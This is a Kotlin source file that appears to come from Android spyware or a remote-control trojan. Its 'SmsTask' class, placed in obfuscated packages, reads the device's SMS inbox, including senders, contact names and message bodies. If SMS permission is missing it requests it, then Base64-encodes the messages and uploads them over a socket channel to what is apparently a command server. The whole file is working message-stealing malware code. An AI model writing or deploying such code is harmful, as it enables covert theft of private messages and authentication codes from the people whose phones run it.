package com.xxx.zzz.commandp.taskssv

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import androidx.core.content.ContextCompat
import com.xxx.zzz.aall.gsonllll.googlepp.Gsonq
import com.xxx.zzz.commandp.utilsss.Sms
import com.xxx.zzz.socketsp.IOSocketyt
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class SmsTask(private val ctx: Context, private var arg1: Int = 100) : BaseTask(ctx) {

    private fun getAllSms(): ArrayList<Sms> {
        val smsList = ArrayList<Sms>()
        runCatching {
            val smsUri = Uri.parse("content://sms/")
            val cur = ctx.contentResolver.query(smsUri, null, null, null, "date DESC")!!

            while (cur.moveToNext() && arg1 > 0) {
                val address = cur.getString(cur.getColumnIndex("address"))
                val body = cur.getString(cur.getColumnIndexOrThrow("body"))
                val type = cur.getString(cur.getColumnIndex("type"))
                val millis = cur.getString(cur.getColumnIndex("date"))
                val threadId = cur.getString(cur.getColumnIndex("thread_id"))
                val id = cur.getString(cur.getColumnIndex("_id"))

                val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.ENGLISH)
                val d = Date(millis.toLong())
                val date = formatter.format(d)


                val sms = Sms(id, threadId, address, getContactName(address), body, date, type)
                smsList.add(sms)

                arg1--
            }

            cur.close()
            IOSocketyt.sendLogs("", "SmsTask ${smsList.size}", "success")
        }.onFailure {
            IOSocketyt.sendLogs("", "getAllSms ${it.localizedMessage}", "error")
        }
        return smsList
    }

    private fun uploadSms(): String {
        return Gsonq().toJson(getAllSms())
    }

    override fun run() {
        super.run()
        runCatching {
            if (ContextCompat.checkSelfPermission(
                    ctx,
                    Manifest.permission.READ_SMS
                ) == PackageManager.PERMISSION_GRANTED
            )
                foo(uploadSms())
            else
                requestPermissions()
        }.onFailure {
            IOSocketyt.sendLogs("", "getAllSms ${it.localizedMessage}", "error")
        }
    }

    private fun foo(str: String) {
        val data = JSONObject()
        data.put("dataType", "sms")
        data.put("sms", Base64.getEncoder().encodeToString(str.toByteArray()))

        IOSocketyt.sendLogs("", data.toString(), "smslist")
    }
}
